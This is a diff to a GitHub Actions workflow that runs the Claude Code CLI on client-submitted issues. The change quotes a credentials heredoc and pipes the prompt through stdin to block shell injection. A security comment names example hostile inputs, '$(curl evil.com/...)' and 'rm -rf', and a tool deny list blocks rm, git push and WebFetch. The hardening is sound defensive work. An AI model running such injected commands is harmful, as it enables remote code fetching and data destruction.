@@ -55,10 +55,12 @@ jobs:
       - name: Pre-write Claude credentials
         if: steps.claim.outputs.has_issue == 'true'
         # Same file `claude setup-token` writes locally. Standalone CLI reads
-        # it for subscription-OAuth auth.
+        # it for subscription-OAuth auth. Quoted heredoc so any `$` in the
+        # token is treated literally (defense-in-depth; tokens shouldn't
+        # contain `$` but it's free safety).
         run: |
           mkdir -p "$HOME/.claude"
-          cat > "$HOME/.claude/.credentials.json" <<EOF
+          cat > "$HOME/.claude/.credentials.json" <<'EOF'
           {"claudeAiOauth": {"accessToken": "${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}", "subscriptionType": "max"}}
           EOF
           chmod 600 "$HOME/.claude/.credentials.json"
@@ -68,6 +70,11 @@ jobs:
         # Direct CLI invocation. No middleware (replaces anthropics/claude-code-action@v1
         # which has broken OAuth wiring — see issues #1026, #1281). The CLI
         # itself handles OAuth correctly via the credentials file above.
+        #
+        # SECURITY: prompt is piped via stdin, NOT command-substituted. The
+        # prompt file is built from client-submitted issue title + description
+        # in claim_issue.py — a hostile client could otherwise inject
+        # $(curl evil.com/...) or `rm -rf` into bash via $(cat).
         #
         # continue-on-error lets finalize.py inspect the working tree for any
         # changes Claude made, even if the CLI exits non-zero on edge cases
@@ -82,7 +89,7 @@ jobs:
             --max-turns 15 \
             --allowed-tools "Read,Edit,Write,Glob,Grep,Bash(npm run *:*),Bash(node:*)" \
             --disallowed-tools "Bash(git push:*),Bash(git commit:*),Bash(rm:*),WebFetch" \
-            "$(cat /tmp/agent-prompt.md)"
+            < /tmp/agent-prompt.md
 
       - name: Commit, push, mark done
         if: steps.claim.outputs.has_issue == 'true'
